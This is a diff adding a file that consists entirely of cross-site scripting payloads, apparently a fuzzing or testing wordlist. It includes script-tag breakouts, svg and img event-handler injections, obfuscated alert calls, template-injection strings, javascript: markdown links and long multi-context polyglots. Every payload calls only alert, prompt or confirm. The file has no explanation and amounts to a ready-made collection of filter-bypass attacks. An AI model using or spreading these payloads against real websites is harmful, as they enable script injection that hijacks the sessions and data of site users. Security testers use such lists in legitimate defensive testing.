@@ -1,0 +1,92 @@
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+</title><script>alert(1);</script>
+</title><script x> alert(1) </script 1=2
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<input type=image src onerror="prompt(1)">
+<svg onload=alert(1)//
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img src='1' onerror='alert(0)' <
+<script x> alert(1) </script 1=2
+<script x>alert('XSS')<script y>
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+<svg////////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+<svg id=`x`onload=alert(1)>
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+</title><script>$=1,alert($)</script>
+</title><script ~~~>confirm(1)</script ~~~>
+</title><script>$=1,\u0061lert($)</script>
+</title><</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+</title><</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</title><scRipt>alert(1)</scRipt>
+<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<svg><x><script>alert('1'&#41</x>
+<iframe src=""/srcdoc='<svg onload=alert(1)>'>
+<svg><animate onbegin=alert() attributeName=x></svg>
+<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
+{{constructor.constructor('alert(1)')()}}
+{{_openBlock.constructor('alert(1)')()}}
+(alert)(1)
+globalThis[`al`+/ert/.source]`1`
+[alert][0].call(this,1)
+window['a'+'l'+'e'+'r'+'t']()
+window['a'+'l'+'e'+'r'+'t'].call(this,1)
+top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
+x=alert,x(1)
+[1].find(alert)
+top[8680439..toString(30)](1)
+top['al\x65rt'](1)
+top['al\145rt'](1)
+al\u0065rt(1)
+al\u0065rt`1`
+top[/al/.source+/ert/.source](1)
+top["al"+"ert"](1)
+[a](javascript:confirm(1)
+[a](javascript://www.google.com%0Aprompt(1))
+[a](javascript://%0d%0aconfirm(1);com)
+[a](javascript:window.onerror=confirm;throw%201)
+[a](javascript:alert(document.domain&#41;)
+[a](javascript://www.google.com%0Aalert(1))
+[a]('javascript:alert("1")')
+[a](JaVaScRiPt:alert(1))
+![a](https://www.google.com/image.png"onload="alert(1))
+![a]("onerror="alert(1))
+</http://<?php\><\h1\><script:script>confirm(2)
+[XSS](.alert(1);)
+javascript\x0A:javascript:alert(1)
+\x1Cjavascript:javascript:alert(1)
+\xE2\x81\x9Fjavascript:javascript:alert(1)
+\xE2\x80\x85javascript:javascript:alert(1)
+javascript:alert(1)
+javascript:confirm(1)
+javascript\x0A:javascript:confirm(1)
+\x1Cjavascript:javascript:confirm(1)
+\xE2\x81\x9Fjavascript:javascript:confirm(1)
+\xE2\x80\x85javascript:javascript:confirm(1)
+avascript:alert()//--></title></style></noscript></noembed></template></select></textarea><frameset onload=alert()></script>*///\"//`//'//"//><svg <svg onload=alert()> alert()//
+javascript:alert()//'//"//\"; '/`/*\/*'/*"/**/(alert())//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert()><script>alert()</script>
+javascript:/*"/*'/*`/*\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>--><<svg onload=alert()><frame src=javascript:alert()>
+javascript:alert()//\"//`//'//"//--></style></select></noscript></noembed></template></title></textarea></script><iframe/srcdoc="<svg/onload=alert()>"><frame/onload=alert()>*/ alert()//
+javascript:alert()//*-->*`/*'/*"/*\"/*</title></textarea></style></noscript></noembed></template><frame src=javascript:alert()></script><script>/*<svg onload=alert()>*/ alert()//</script>
+jaVasCript:/*`/*\`/*'/*\"//"/**/(onload=alert())//<svg/onload=alert()><frame/onload=alert()></select></noscript></noembed></template></stYle/</titLe/</teXtarEa/</script/--><sVg/oNloAd= alert()//>
+javascript:alert()//'//"//`//></a></option></select></template></noscript></script></title></style></textarea></noembed>--><<svg onload=alert()>\">alert()//*/ alert()//<frame src=javascript:alert()>
+javascript:alert()//\ /*<svg/onload=';alert();'></textarea></style></title></noscript></template></noembed><frame onload=";alert();"></script>--><script>alert`;alert();`</script>*/alert()//\";alert()//
+javascript:alert/*`/*\/*'/*\"/*"/**/(alert())// alert()//--></template><frame/onload=alert() <img src=x onerror=alert()></style/</title/</textarea/</noscript/</noembed/</script><script>alert()</script>
+javascript:alert();//</title></noscript></noembed></template></style></textarea><frameset onload='+/"/+/[*/[]/+alert()//'-->\" alert();/*`/**/(/**/alert())//<script>alert()</script><<svg onload=alert()>>
+javascript:alert()//*/alert()/*'-/"/-eval(`(alert())`)//\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//
+javascript:alert()//\";alert();/*-/*`/*\`/*'/*"/**///--><FRAME SRC="javascript:alert();"></textarea></style></noscript></noembed></template></option></select></script></title><svg/onload=alert()><svg/onload=alert()> alert(1)// 
+javascript:alert()//<frame/src=javascript:alert()><svg/onload=alert()>`;alert()`';alert()//\";alert();//"//--></title></textarea></style></noscript></noembed></template></option></select></script><svg onload=alert()>*/ alert()//* 
+javascript:alert()//</title></style></textarea></noscript></template></noembed><script>alert()</script>-->\";alert()//";alert()//';alert()//<script>alert()</script><frame src="javascript:alert()">` alert()//<svg/onload=alert()>*/alert()/* 
+javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!-- 
+javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/"/+/onclick=1/+/[*/[]/+alert()//'>"><svg/onload=`+/"/+/onclick=/+/[*/[]/+alert()//'>"><script>alert()</script><frame src="javascript:alert()"></frameset>+\"; alert()//<img src onerror=alert()>
+javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)// 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
